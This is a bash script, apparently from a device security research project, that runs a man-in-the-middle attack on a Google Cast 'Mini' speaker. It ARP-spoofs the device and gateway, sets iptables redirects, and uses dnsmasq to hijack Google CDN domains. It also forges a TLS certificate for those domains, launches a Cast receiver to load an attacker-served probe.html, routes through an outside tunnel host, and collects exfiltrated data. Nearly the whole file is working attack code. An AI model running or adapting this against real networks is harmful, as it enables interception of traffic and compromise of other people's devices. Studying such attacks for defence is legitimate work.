#!/usr/bin/env bash
# mitm-attack.sh — ARP MITM + DNS hijack to deliver probe.html to cast_shell.
#
# Run with sudo:  sudo bash scripts/mitm-attack.sh
#
# What this does:
#   1. Provisions the Mini to LAN (connect_wifi via setup AP)
#   2. ARP-poisons the Mini so our machine is its gateway
#   3. Redirects Mini's DNS queries to our dnsmasq
#   4. dnsmasq returns our IP for Cast receiver / CDN domains
#   5. Serves probe.html over HTTP (port 80) and HTTPS (port 4443, fake cert)
#   6. Fires Cast LAUNCH for CC1AD845 → Mini fetches receiver URL → hits us
#   7. probe.html runs in cast_shell Chromium → exfil SQLite version
#   8. Restores everything on exit
#
# Requires: arpspoof (dsniff), dnsmasq, openssl, python3, nmcli, nmap

set -euo pipefail

MISE_PY=/home/tkmremi/.local/share/mise/installs/python/latest/bin/python3
MISE_SP=/home/tkmremi/.local/share/mise/installs/python/3.15.1/lib/python3.15/site-packages
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
MAGELLAN="$ROOT/reconstruction/exploit/magellan"
MY_IP="192.168.1.24"
MINI_MAC="44:07:0b:d2:6f:36"
GW="192.168.1.1"
IFACE="wlp0s20f3"
LOG="/tmp/mitm-attack.log"
CAP="/tmp/mini-traffic.pcap"
CERT="/tmp/fake-cast.crt"
KEY="/tmp/fake-cast.key"

export PYTHONPATH="$MISE_SP"
exec > >(tee -a "$LOG") 2>&1
> "$LOG"

log() { echo "[$(date '+%H:%M:%S')] $*"; }
die() { log "FATAL: $*"; exit 1; }

# requires privileged setup first: sudo bash scripts/mitm-setup-root.sh

TUNNEL="${TUNNEL:-https://c40aef6432563de7-82-122-71-109.serveousercontent.com}"
export TUNNEL MY_IP CERT KEY MITM_PORT=4443

log "===== MITM ATTACK START ====="
log "Tunnel: $TUNNEL"

# ── cleanup ────────────────────────────────────────────────────────────────────
cleanup() {
  log "Cleanup..."
  kill ${SPOOF1_PID:-} ${SPOOF2_PID:-} 2>/dev/null; sleep 0.5
  pkill -f "dnsmasq.*5354" 2>/dev/null || true
  pkill -f "mitm_https_server\|exfil_server" 2>/dev/null || true
  pkill -f "tcpdump.*$CAP" 2>/dev/null || true
  # iptables rules were set by mitm-setup-root.sh; try to remove with sudo -n (non-interactive)
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p udp --dport 53 -j REDIRECT --to-port 5354 2>/dev/null || true
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 53 -j REDIRECT --to-port 5354 2>/dev/null || true
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 80  -j REDIRECT --to-port 8080 2>/dev/null || true
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 443 -j REDIRECT --to-port 4443 2>/dev/null || true
  log "===== DONE. Log: $LOG  Cap: $CAP ====="
}
trap cleanup EXIT INT TERM

# ── PHASE 0: prep ─────────────────────────────────────────────────────────────
log "PHASE 0: creating fake TLS cert + starting servers..."

# Fake TLS cert for the Google Cast CDN domains
openssl req -x509 -newkey rsa:2048 -days 1 -nodes \
  -keyout "$KEY" -out "$CERT" \
  -subj "/CN=commondatastorage.googleapis.com/O=FakeCDN" \
  -addext "subjectAltName=DNS:commondatastorage.googleapis.com,DNS:www.gstatic.com,DNS:clients3.google.com,DNS:cast.google.com,DNS:*.googleapis.com,DNS:*.gstatic.com" \
  2>/dev/null
log "Fake cert: $CERT"

# Start exfil server (pages on :8080, log on :8081)
pkill -f "exfil_server" 2>/dev/null || true; sleep 0.3
$MISE_PY "$MAGELLAN/exfil_server.py" --ip "$MY_IP" &
EXFIL_PID=$!
sleep 0.5
curl -s --max-time 2 "http://$MY_IP:8080/probe.html" -o /dev/null && log "Exfil server OK" || die "Exfil server failed"

# Start HTTPS server on port 4443 — handles registry API + serves probe.html
# mitm_https_server.py intercepts /cast/v2/receiver and returns TUNNEL as receiver URL
# so cast_shell (if daemon accepts our cert) loads probe.html via valid Cloudflare TLS
pkill -f "mitm_https_server" 2>/dev/null || true; sleep 0.2
FAKE_CERT="$CERT" FAKE_KEY="$KEY" MITM_PORT=4443 TUNNEL="$TUNNEL" MY_IP="$MY_IP" \
  $MISE_PY "$MAGELLAN/mitm_https_server.py" 2>&1 &
HTTPS_PID=$!
sleep 0.8
kill -0 $HTTPS_PID 2>/dev/null && log "MITM HTTPS server started on :4443 (PID=$HTTPS_PID)" \
  || die "MITM HTTPS server failed to start"

# Also redirect port 80 requests to our exfil server (since 8080 is already running)
# We'll use iptables REDIRECT for port 80 → 8080 after arpspoof is set up

# ── PHASE 1+2: find Mini on LAN (skip provisioning if already present) ────────
log "PHASE 1: finding Mini on LAN by MAC $MINI_MAC..."
MINI_IP=""
DEADLINE=$((SECONDS+90))

# First try: already in ARP table
MINI_IP=$(arp -n 2>/dev/null | awk -v m="$MINI_MAC" 'tolower($3)==m{print $1}' | head -1)
if [[ -n "$MINI_IP" ]]; then
  log "Mini already on LAN at $MINI_IP (from ARP cache)"
fi
while [[ $SECONDS -lt $DEADLINE && -z "$MINI_IP" ]]; do
  nmap -sn -T5 --host-timeout 2s 192.168.1.0/24 -oG /tmp/nmap_scan.txt 2>/dev/null
  while IFS= read -r line; do
    ip=$(echo "$line" | grep -oP '(?<=Host: )\S+')
    [[ -z "$ip" ]] && continue
    mac=$(arp -n "$ip" 2>/dev/null | awk '{print tolower($3)}' | grep "^44:07" | head -1)
    [[ "$mac" == "$MINI_MAC" ]] && { MINI_IP="$ip"; break; }
  done < /tmp/nmap_scan.txt
  [[ -n "$MINI_IP" ]] && break
  MINI_IP=$(arp -n 2>/dev/null | awk -v m="$MINI_MAC" 'tolower($3)==m{print $1}' | head -1)
  [[ -n "$MINI_IP" ]] && break
  sleep 5
done
[[ -z "$MINI_IP" ]] && die "Mini not found on LAN"
log "Mini at $MINI_IP"

# If Mini got a different IP, update iptables rules dynamically
if [[ "$MINI_IP" != "192.168.1.29" ]]; then
  log "Mini IP changed to $MINI_IP — updating iptables rules..."
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p udp --dport 53 -j REDIRECT --to-port 5354 2>/dev/null || true
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 80  -j REDIRECT --to-port 8080 2>/dev/null || true
  sudo -n iptables -t nat -D PREROUTING -i "$IFACE" -s "192.168.1.29" -p tcp --dport 443 -j REDIRECT --to-port 4443 2>/dev/null || true
  sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p udp --dport 53  -j REDIRECT --to-port 5354
  sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p tcp --dport 80  -j REDIRECT --to-port 8080
  sudo -n iptables -t nat -A PREROUTING -i "$IFACE" -s "$MINI_IP"   -p tcp --dport 443 -j REDIRECT --to-port 4443
  log "iptables updated for $MINI_IP"
fi

# ── PHASE 4: ARP MITM ──────────────────────────────────────────────────────────
log "PHASE 4: starting ARP MITM (we become Mini's gateway)..."

# ARP spoof (both directions so traffic flows through us)
# arpspoof must have cap_net_raw — run mitm-setup-root.sh first
arpspoof -i "$IFACE" -t "$MINI_IP" "$GW" > /dev/null 2>&1 & SPOOF1_PID=$!
arpspoof -i "$IFACE" -t "$GW" "$MINI_IP" > /dev/null 2>&1 & SPOOF2_PID=$!

# Wait for ARP to propagate
sleep 3
# iptables and ip_forward were set by mitm-setup-root.sh — no root needed here
log "ARP spoof started (rules already in place from mitm-setup-root.sh)"

# Extract tunnel hostname for explicit DNS passthrough
TUNNEL_HOST=$(echo "$TUNNEL" | sed 's|https://||;s|/.*||')
TUNNEL_IP=$(dig @1.1.1.1 "$TUNNEL_HOST" A +short 2>/dev/null | head -1)
log "Tunnel host: $TUNNEL_HOST → $TUNNEL_IP"

# Start dnsmasq on port 5353
# - Returns our IP for Cast CDN / registry domains (registry MITM path)
# - Returns Cloudflare IP for our tunnel domain (so Mini can reach probe.html)
# - Uses 1.1.1.1 for trycloudflare.com (router may not resolve it)
# - Forwards everything else to the real Livebox DNS
pkill -f "dnsmasq.*5354" 2>/dev/null || true; sleep 0.2
dnsmasq --no-daemon --port=5354 \
  --listen-address=127.0.0.1 --listen-address="$MY_IP" \
  --bind-interfaces \
  --address=/commondatastorage.googleapis.com/"$MY_IP" \
  --address=/gstatic.com/"$MY_IP" \
  --address=/www.gstatic.com/"$MY_IP" \
  --address=/clients3.google.com/"$MY_IP" \
  --address=/cast.google.com/"$MY_IP" \
  --address=/eureka.gvt1.com/"$MY_IP" \
  --address=/connectivitycheck.gstatic.com/"$MY_IP" \
  ${TUNNEL_HOST:+--address=/"$TUNNEL_HOST"/"${TUNNEL_IP:-104.16.230.132}"} \
  --server=/trycloudflare.com/1.1.1.1 \
  --server="$GW" \
  --log-queries 2>&1 | grep --line-buffered -v "^$" &
DNSMASQ_PID=$!
sleep 0.5
log "dnsmasq started (PID=$DNSMASQ_PID)"

# Test DNS hijack works
resolved=$(dig @127.0.0.1 -p 5354 commondatastorage.googleapis.com A +short 2>/dev/null | head -1)
log "DNS test: commondatastorage.googleapis.com → $resolved (expected $MY_IP)"

# Start tcpdump (we're in wireshark group)
tcpdump -i "$IFACE" -w "$CAP" "host $MINI_IP" 2>/dev/null &
TCPDUMP_PID=$!
log "tcpdump started (PID=$TCPDUMP_PID)"

# ── PHASE 5: wait for Cast port ────────────────────────────────────────────────
log "PHASE 5: waiting for Cast port 8009 (800s max)..."
CAST_OPEN=0
DEADLINE=$((SECONDS+800))
while [[ $SECONDS -lt $DEADLINE ]]; do
  nc -z -w2 "$MINI_IP" 8009 2>/dev/null && { log "Cast port 8009 OPEN"; CAST_OPEN=1; break; }
  nc -z -w2 "$MINI_IP" 8008 2>/dev/null && { log "Cast port 8008 OPEN"; CAST_OPEN=1; break; }
  sleep 10
done
[[ $CAST_OPEN -eq 0 ]] && log "WARNING: Cast port not opened, trying anyway"

# ── PHASE 6: fire LAUNCH ───────────────────────────────────────────────────────
log "PHASE 6: firing Cast LAUNCH (probe.html)..."
log "  ARP MITM is active — Mini's DNS now points to us for CDN domains"
log "  If cast_shell fetches receiver URL, it will hit our server at :4443 or :8080"

# Fire Cast LAUNCH via inline Python (no cast_launch.py dependency)
log "  Sending LAUNCH CC1AD845 — cast daemon should query registry (intercepted → probe.html)"
$MISE_PY -I << PYEOF &
import json, socket, ssl, struct, time, sys

MINI = "$MINI_IP"
TUNNEL = "$TUNNEL"

def _v(n):
    o=[]
    while n>0x7f: o.append((n&0x7f)|0x80); n>>=7
    o.append(n); return bytes(o)
def _f(num,wire,data):
    t=_v((num<<3)|wire)
    if wire==2: return t+_v(len(data))+data
    if wire==0: return t+_v(data)
def cm(ns,src,dst,p):
    pb=(_f(1,0,0)+_f(2,2,src.encode())+_f(3,2,dst.encode())+_f(4,2,ns.encode())+_f(5,0,0)+_f(6,2,p.encode()))
    return struct.pack(">I",len(pb))+pb

ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
ctx.set_ciphers("ALL:@SECLEVEL=0")
try: ctx.options|=ssl.OP_LEGACY_SERVER_CONNECT
except: pass

NS_CONN="urn:x-cast:com.google.cast.tp.connection"
NS_RECV="urn:x-cast:com.google.cast.receiver"
NS_HB="urn:x-cast:com.google.cast.tp.heartbeat"

def recv_msgs(sock, secs=5):
    msgs=[]; buf=bytearray(); deadline=time.time()+secs
    while time.time()<deadline:
        sock.settimeout(max(0.1,deadline-time.time()))
        try:
            c=sock.recv(4096)
            if c: buf.extend(c)
            else: break
        except: pass
        while len(buf)>=4:
            sz=struct.unpack(">I",buf[:4])[0]
            if sz>5*1024*1024 or len(buf)<4+sz: break
            pkt=bytes(buf[4:4+sz]); del buf[:4+sz]
            idx=0
            while idx<len(pkt):
                tb=pkt[idx]; idx+=1; fn=tb>>3; wt=tb&7
                if wt==2:
                    l=0; sh=0
                    while True:
                        b=pkt[idx]; idx+=1; l|=(b&0x7f)<<sh; sh+=7
                        if not (b&0x80): break
                    val=pkt[idx:idx+l]; idx+=l
                    if fn==6 and val:
                        try: msgs.append(json.loads(val))
                        except: pass
                elif wt==0:
                    while idx<len(pkt) and pkt[idx]&0x80: idx+=1
                    if idx<len(pkt): idx+=1
                else: break
    return msgs

for attempt in range(3):
    try:
        raw=socket.create_connection((MINI,8009),timeout=8)
        sock=ctx.wrap_socket(raw,server_hostname=MINI)
        sock.sendall(cm(NS_CONN,"sender-0","receiver-0",json.dumps({"type":"CONNECT","origin":{}})))
        sock.sendall(cm(NS_RECV,"sender-0","receiver-0",json.dumps({"type":"LAUNCH","appId":"CC1AD845","requestId":10})))
        print(f"[cast_launch] LAUNCH sent (attempt {attempt+1})", flush=True)
        for m in recv_msgs(sock,10):
            print(f"[cast_launch] {m.get('type','?')}", flush=True)
            if m.get('type')=='RECEIVER_STATUS':
                for app in m.get('status',{}).get('applications',[]):
                    print(f"[cast_launch]   app={app.get('appId')} status={app.get('statusText','')}", flush=True)
        sock.sendall(cm(NS_HB,"sender-0","receiver-0",json.dumps({"type":"PING"})))
        time.sleep(30)
        sock.close()
        break
    except Exception as e:
        print(f"[cast_launch] err attempt {attempt+1}: {e}", flush=True)
        time.sleep(3)
PYEOF
CAST_PID=$!

log "Watching MITM HTTPS hits for 120s..."
DEADLINE=$((SECONDS+120))
while [[ $SECONDS -lt $DEADLINE ]]; do
  sleep 5
  if [[ -f /tmp/mitm_hits.log ]]; then
    NEW=$(tail -5 /tmp/mitm_hits.log 2>/dev/null)
    [[ -n "$NEW" ]] && log "MITM hit: $NEW"
  fi
done

# ── PHASE 7: analyze capture ────────────────────────────────────────────────────
log "PHASE 7: analyzing traffic capture..."
log "--- DNS queries from Mini ---"
tcpdump -r "$CAP" -nn port 53 2>/dev/null | head -30 || true
log "--- HTTP requests from Mini ---"
tcpdump -r "$CAP" -A -nn 'tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 4443' 2>/dev/null \
  | grep -E "GET |POST |Host:" | head -20 || true
log "--- TLS SNI from Mini ---"
tshark -r "$CAP" -Y "ssl.handshake.extensions_server_name" \
       -T fields -e "ip.src" -e "ssl.handshake.extensions_server_name" 2>/dev/null \
  | sort -u | head -20 || echo "(tshark not available)"
log "--- Exfil evidence files ---"
ls -lt "$ROOT/evidence"/magellan-exfil-*.json 2>/dev/null | head -5 || echo "none"
for f in "$ROOT/evidence"/magellan-exfil-*.json; do
  [[ -f "$f" ]] || continue
  log "$(basename $f):"; python3 -m json.tool "$f" 2>/dev/null | head -10
done
log "MITM attack done. Cleanup will run on exit."
